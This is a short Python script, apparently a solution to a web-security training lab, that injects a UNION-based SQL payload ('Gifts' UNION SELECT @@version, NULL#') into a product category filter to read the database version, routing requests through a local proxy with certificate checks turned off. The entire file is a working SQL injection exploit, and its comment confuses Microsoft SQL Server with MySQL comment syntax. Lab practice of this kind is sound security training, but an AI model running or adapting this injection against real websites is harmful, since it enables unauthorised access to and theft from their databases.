import urllib3
import sys
import requests
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def extract_version(url:str):
    # Microsoft DB => SELECT @@version, # for comment => encoded = %23
    payload = "@@version, NULL%23"
    url = url + "/filter?category=" + "Gifts' UNION SELECT " + payload
    try:
        r = requests.get(url, proxies=proxies, verify=False)
        if r.status_code == 200:
            return True
        else:
            print("Failed to extract version")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False


def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    if extract_version(url):
        print("Lab Solved!")
        sys.exit(0)
    else:
        sys.exit(-1)
    


if __name__ == '__main__':
    main()